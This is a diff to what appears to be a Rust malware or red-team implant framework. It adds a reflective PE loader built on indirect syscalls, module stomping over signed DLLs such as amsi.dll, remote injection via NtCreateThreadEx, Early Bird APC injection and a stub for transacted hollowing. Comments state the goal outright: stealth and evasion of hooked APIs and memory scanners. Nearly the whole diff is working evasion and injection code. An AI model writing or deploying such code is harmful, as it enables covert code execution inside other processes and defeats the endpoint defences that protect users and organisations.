@@ -683,6 +683,502 @@ pub mod pic_integration {
     }
 }
 
+/// Syscall-based reflective loader for maximum stealth
+/// Uses SysWhispers3 indirect syscalls instead of Win32 APIs
+pub mod syscall_loader {
+    use super::*;
+    use crate::syscalls::{self, hashes, current_process, STATUS_SUCCESS};
+    use winapi::um::winnt::{
+        MEM_COMMIT, MEM_RESERVE, MEM_RELEASE, PAGE_READWRITE, PAGE_EXECUTE_READ,
+        PAGE_EXECUTE_READWRITE, PAGE_READONLY, SECTION_ALL_ACCESS, SEC_COMMIT,
+    };
+
+    /// Load PE using direct/indirect syscalls only
+    /// Avoids all hooked Win32 APIs
+    pub unsafe fn load_with_syscalls(pe_bytes: &[u8]) -> Result<ReflectiveLoader, ReflectiveError> {
+        // Initialize syscall table if not already done
+        if syscalls::init_syscalls().is_err() {
+            return Err(ReflectiveError::AllocationFailed);
+        }
+
+        let pe = ParsedPe::parse(pe_bytes)?;
+
+        // Allocate via NtAllocateVirtualMemory
+        let mut base: PVOID = null_mut();
+        let mut size = pe.image_size as usize;
+
+        let status = syscalls::nt_allocate_virtual_memory(
+            current_process(),
+            &mut base,
+            0,
+            &mut size,
+            MEM_COMMIT | MEM_RESERVE,
+            PAGE_READWRITE,
+        );
+
+        if status != STATUS_SUCCESS || base.is_null() {
+            return Err(ReflectiveError::AllocationFailed);
+        }
+
+        // Copy headers
+        std::ptr::copy_nonoverlapping(
+            pe.raw.as_ptr(),
+            base as *mut u8,
+            pe.nt_headers.OptionalHeader.SizeOfHeaders as usize,
+        );
+
+        // Copy sections
+        for section in pe.sections {
+            if section.SizeOfRawData == 0 {
+                continue;
+            }
+
+            let section_dest = (base as usize + section.VirtualAddress as usize) as *mut u8;
+            let section_src = pe.raw.as_ptr().add(section.PointerToRawData as usize);
+            let section_size = section.SizeOfRawData as usize;
+
+            std::ptr::copy_nonoverlapping(section_src, section_dest, section_size);
+        }
+
+        // Process relocations
+        let delta = base as u64 - pe.image_base;
+        if delta != 0 {
+            ReflectiveLoader::process_relocations(base, &pe, delta)?;
+        }
+
+        // Resolve imports (still needs LoadLibrary - could be improved with manual mapping)
+        ReflectiveLoader::resolve_imports(base, &pe)?;
+
+        // Set section protections via NtProtectVirtualMemory
+        set_section_protections_syscall(base, &pe)?;
+
+        let entry = (base as usize + pe.entry_point as usize) as *mut c_void;
+
+        Ok(ReflectiveLoader {
+            base_address: base,
+            entry_point: entry,
+            image_size: pe.image_size as usize,
+        })
+    }
+
+    /// Set section protections using syscalls
+    unsafe fn set_section_protections_syscall(
+        base: *mut c_void,
+        pe: &ParsedPe,
+    ) -> Result<(), ReflectiveError> {
+        for section in pe.sections {
+            let characteristics = section.Characteristics;
+            let mut section_base = (base as usize + section.VirtualAddress as usize) as PVOID;
+            let mut section_size = *section.Misc.VirtualSize() as usize;
+
+            if section_size == 0 {
+                continue;
+            }
+
+            let protection = if characteristics & 0x20000000 != 0 {
+                if characteristics & 0x80000000 != 0 {
+                    PAGE_EXECUTE_READWRITE
+                } else {
+                    PAGE_EXECUTE_READ
+                }
+            } else if characteristics & 0x80000000 != 0 {
+                PAGE_READWRITE
+            } else {
+                PAGE_READONLY
+            };
+
+            let mut old_protect: u32 = 0;
+            syscalls::nt_protect_virtual_memory(
+                current_process(),
+                &mut section_base,
+                &mut section_size,
+                protection,
+                &mut old_protect,
+            );
+        }
+
+        Ok(())
+    }
+
+    /// Free loaded PE using syscalls
+    pub unsafe fn unload_syscall(loader: &mut ReflectiveLoader) {
+        if !loader.base_address.is_null() {
+            let mut base = loader.base_address;
+            let mut size: usize = 0;
+            syscalls::nt_free_virtual_memory(
+                current_process(),
+                &mut base,
+                &mut size,
+                MEM_RELEASE,
+            );
+            loader.base_address = null_mut();
+        }
+    }
+}
+
+/// Module stomping: Load PE into a legitimate DLL's memory space
+/// This evades unbacked memory detection by hiding in a signed DLL
+pub mod module_stomping {
+    use super::*;
+    use crate::syscalls::{self, current_process, STATUS_SUCCESS};
+    use winapi::um::libloaderapi::LoadLibraryA;
+    use winapi::um::winnt::{PAGE_READWRITE, PAGE_EXECUTE_READ};
+
+    /// Candidate DLLs for stomping (should be large enough and rarely used)
+    const STOMP_CANDIDATES: &[&str] = &[
+        "amsi.dll\0",
+        "clrjit.dll\0",
+        "mscoree.dll\0",
+        "chakra.dll\0",
+        "dbghelp.dll\0",
+    ];
+
+    /// Load PE by stomping over a legitimate DLL
+    pub unsafe fn stomp_load(pe_bytes: &[u8]) -> Result<StompedLoader, ReflectiveError> {
+        let pe = ParsedPe::parse(pe_bytes)?;
+        let required_size = pe.image_size as usize;
+
+        // Initialize syscalls
+        if syscalls::init_syscalls().is_err() {
+            return Err(ReflectiveError::AllocationFailed);
+        }
+
+        // Find a suitable DLL to stomp
+        let mut target_base: *mut c_void = null_mut();
+        let mut stomped_dll = String::new();
+
+        for &dll_name in STOMP_CANDIDATES {
+            let handle = LoadLibraryA(dll_name.as_ptr() as *const i8);
+            if !handle.is_null() {
+                // Check if DLL is large enough
+                let dos_header = handle as *const IMAGE_DOS_HEADER;
+                let nt_headers = (handle as usize + (*dos_header).e_lfanew as usize)
+                    as *const IMAGE_NT_HEADERS64;
+                let dll_size = (*nt_headers).OptionalHeader.SizeOfImage as usize;
+
+                if dll_size >= required_size {
+                    target_base = handle as *mut c_void;
+                    stomped_dll = dll_name.trim_end_matches('\0').to_string();
+                    break;
+                }
+            }
+        }
+
+        if target_base.is_null() {
+            return Err(ReflectiveError::AllocationFailed);
+        }
+
+        // Make the DLL's memory writable
+        let mut base_ptr = target_base;
+        let mut size = required_size;
+        let mut old_protect: u32 = 0;
+
+        let status = syscalls::nt_protect_virtual_memory(
+            current_process(),
+            &mut base_ptr,
+            &mut size,
+            PAGE_READWRITE,
+            &mut old_protect,
+        );
+
+        if status != STATUS_SUCCESS {
+            return Err(ReflectiveError::AllocationFailed);
+        }
+
+        // Zero out the target region first
+        std::ptr::write_bytes(target_base as *mut u8, 0, required_size);
+
+        // Copy PE headers
+        std::ptr::copy_nonoverlapping(
+            pe.raw.as_ptr(),
+            target_base as *mut u8,
+            pe.nt_headers.OptionalHeader.SizeOfHeaders as usize,
+        );
+
+        // Copy sections
+        for section in pe.sections {
+            if section.SizeOfRawData == 0 {
+                continue;
+            }
+
+            let section_dest = (target_base as usize + section.VirtualAddress as usize) as *mut u8;
+            let section_src = pe.raw.as_ptr().add(section.PointerToRawData as usize);
+            let section_size = section.SizeOfRawData as usize;
+
+            std::ptr::copy_nonoverlapping(section_src, section_dest, section_size);
+        }
+
+        // Process relocations
+        let delta = target_base as u64 - pe.image_base;
+        if delta != 0 {
+            ReflectiveLoader::process_relocations(target_base, &pe, delta)?;
+        }
+
+        // Resolve imports
+        ReflectiveLoader::resolve_imports(target_base, &pe)?;
+
+        // Restore executable permissions
+        let mut base_ptr = target_base;
+        let mut size = required_size;
+        syscalls::nt_protect_virtual_memory(
+            current_process(),
+            &mut base_ptr,
+            &mut size,
+            PAGE_EXECUTE_READ,
+            &mut old_protect,
+        );
+
+        let entry = (target_base as usize + pe.entry_point as usize) as *mut c_void;
+
+        Ok(StompedLoader {
+            base_address: target_base,
+            entry_point: entry,
+            stomped_dll,
+            original_size: required_size,
+        })
+    }
+
+    /// Stomped module loader (doesn't free memory since it belongs to legitimate DLL)
+    pub struct StompedLoader {
+        pub base_address: *mut c_void,
+        pub entry_point: *mut c_void,
+        pub stomped_dll: String,
+        pub original_size: usize,
+    }
+
+    impl StompedLoader {
+        /// Execute the stomped PE
+        pub unsafe fn execute(&self) -> Result<usize, ReflectiveError> {
+            type DllMain = unsafe extern "system" fn(HMODULE, DWORD, LPVOID) -> i32;
+
+            let entry: DllMain = std::mem::transmute(self.entry_point);
+            let result = entry(self.base_address as HMODULE, 1, null_mut());
+
+            Ok(result as usize)
+        }
+    }
+}
+
+/// Remote injection using syscalls (NtCreateThreadEx instead of CreateRemoteThread)
+pub mod syscall_injection {
+    use super::*;
+    use crate::syscalls::{self, hashes, STATUS_SUCCESS};
+    use winapi::shared::ntdef::OBJECT_ATTRIBUTES;
+    use winapi::um::winnt::{
+        MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PROCESS_ALL_ACCESS,
+        THREAD_ALL_ACCESS,
+    };
+
+    /// CLIENT_ID structure for NtOpenProcess
+    #[repr(C)]
+    struct ClientId {
+        unique_process: HANDLE,
+        unique_thread: HANDLE,
+    }
+
+    /// Inject into remote process using only syscalls
+    pub unsafe fn inject_syscall(
+        pe_bytes: &[u8],
+        target_pid: u32,
+    ) -> Result<HANDLE, ReflectiveError> {
+        // Initialize syscalls
+        if syscalls::init_syscalls().is_err() {
+            return Err(ReflectiveError::AllocationFailed);
+        }
+
+        let pe = ParsedPe::parse(pe_bytes)?;
+
+        // Open target process via NtOpenProcess
+        let mut process_handle: HANDLE = null_mut();
+        let mut obj_attr: OBJECT_ATTRIBUTES = std::mem::zeroed();
+        obj_attr.Length = std::mem::size_of::<OBJECT_ATTRIBUTES>() as u32;
+
+        let mut client_id = ClientId {
+            unique_process: target_pid as HANDLE,
+            unique_thread: null_mut(),
+        };
+
+        let status = syscalls::nt_open_process(
+            &mut process_handle,
+            PROCESS_ALL_ACCESS,
+            &mut obj_attr,
+            &mut client_id as *mut _ as PVOID,
+        );
+
+        if status != STATUS_SUCCESS || process_handle.is_null() {
+            return Err(ReflectiveError::ProcessOpenFailed);
+        }
+
+        // Allocate memory in target via NtAllocateVirtualMemory
+        let mut remote_base: PVOID = null_mut();
+        let mut size = pe.image_size as usize;
+
+        let status = syscalls::nt_allocate_virtual_memory(
+            process_handle,
+            &mut remote_base,
+            0,
+            &mut size,
+            MEM_COMMIT | MEM_RESERVE,
+            PAGE_EXECUTE_READWRITE,
+        );
+
+        if status != STATUS_SUCCESS || remote_base.is_null() {
+            syscalls::nt_close(process_handle);
+            return Err(ReflectiveError::AllocationFailed);
+        }
+
+        // Prepare local image
+        let local_loader = ReflectiveLoader::load_local(pe_bytes)?;
+
+        // Rebase for remote address
+        let delta = remote_base as u64 - local_loader.base_address as u64;
+        if delta != 0 {
+            RemoteInjector::rebase_for_remote(local_loader.base_address, &pe, delta)?;
+        }
+
+        // Write to remote via NtWriteVirtualMemory
+        let mut bytes_written: usize = 0;
+        let status = syscalls::nt_write_virtual_memory(
+            process_handle,
+            remote_base,
+            local_loader.base_address,
+            pe.image_size as usize,
+            &mut bytes_written,
+        );
+
+        if status != STATUS_SUCCESS {
+            syscalls::nt_close(process_handle);
+            return Err(ReflectiveError::InjectionFailed);
+        }
+
+        // Create remote thread via NtCreateThreadEx
+        let remote_entry = (remote_base as usize + pe.entry_point as usize) as PVOID;
+        let mut thread_handle: HANDLE = null_mut();
+
+        let status = syscalls::nt_create_thread_ex(
+            &mut thread_handle,
+            THREAD_ALL_ACCESS,
+            null_mut(),
+            process_handle,
+            remote_entry,
+            null_mut(),
+            0, // Not suspended
+            0,
+            0,
+            0,
+            null_mut(),
+        );
+
+        syscalls::nt_close(process_handle);
+
+        if status != STATUS_SUCCESS || thread_handle.is_null() {
+            return Err(ReflectiveError::ThreadCreationFailed);
+        }
+
+        Ok(thread_handle)
+    }
+
+    /// Inject using APC (Early Bird technique)
+    pub unsafe fn inject_apc(
+        pe_bytes: &[u8],
+        target_pid: u32,
+        thread_handle: HANDLE,
+    ) -> Result<(), ReflectiveError> {
+        // Initialize syscalls
+        if syscalls::init_syscalls().is_err() {
+            return Err(ReflectiveError::AllocationFailed);
+        }
+
+        let pe = ParsedPe::parse(pe_bytes)?;
+
+        // Open target process
+        let mut process_handle: HANDLE = null_mut();
+        let mut obj_attr: OBJECT_ATTRIBUTES = std::mem::zeroed();
+        obj_attr.Length = std::mem::size_of::<OBJECT_ATTRIBUTES>() as u32;
+
+        let mut client_id = ClientId {
+            unique_process: target_pid as HANDLE,
+            unique_thread: null_mut(),
+        };
+
+        let status = syscalls::nt_open_process(
+            &mut process_handle,
+            PROCESS_ALL_ACCESS,
+            &mut obj_attr,
+            &mut client_id as *mut _ as PVOID,
+        );
+
+        if status != STATUS_SUCCESS {
+            return Err(ReflectiveError::ProcessOpenFailed);
+        }
+
+        // Allocate and write PE (same as inject_syscall)
+        let mut remote_base: PVOID = null_mut();
+        let mut size = pe.image_size as usize;
+
+        syscalls::nt_allocate_virtual_memory(
+            process_handle,
+            &mut remote_base,
+            0,
+            &mut size,
+            MEM_COMMIT | MEM_RESERVE,
+            PAGE_EXECUTE_READWRITE,
+        );
+
+        if remote_base.is_null() {
+            syscalls::nt_close(process_handle);
+            return Err(ReflectiveError::AllocationFailed);
+        }
+
+        let local_loader = ReflectiveLoader::load_local(pe_bytes)?;
+        let delta = remote_base as u64 - local_loader.base_address as u64;
+        if delta != 0 {
+            RemoteInjector::rebase_for_remote(local_loader.base_address, &pe, delta)?;
+        }
+
+        syscalls::nt_write_virtual_memory(
+            process_handle,
+            remote_base,
+            local_loader.base_address,
+            pe.image_size as usize,
+            null_mut(),
+        );
+
+        // Queue APC instead of creating thread
+        let remote_entry = (remote_base as usize + pe.entry_point as usize) as PVOID;
+
+        let status = syscalls::nt_queue_apc_thread(
+            thread_handle,
+            remote_entry,
+            null_mut(),
+            null_mut(),
+            null_mut(),
+        );
+
+        syscalls::nt_close(process_handle);
+
+        if status != STATUS_SUCCESS {
+            return Err(ReflectiveError::ThreadCreationFailed);
+        }
+
+        Ok(())
+    }
+}
+
+/// Transacted Hollowing: Use NTFS transactions for atomic loading
+pub mod transacted_hollowing {
+    use super::*;
+
+    // Placeholder for TxF-based hollowing
+    // Would use NtCreateTransaction, RtlSetCurrentTransaction, CreateFileTransacted
+    // to create a "ghost" file that exists only in transaction context
+
+    pub struct TransactedLoader {
+        pub base_address: *mut c_void,
+        pub entry_point: *mut c_void,
+    }
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
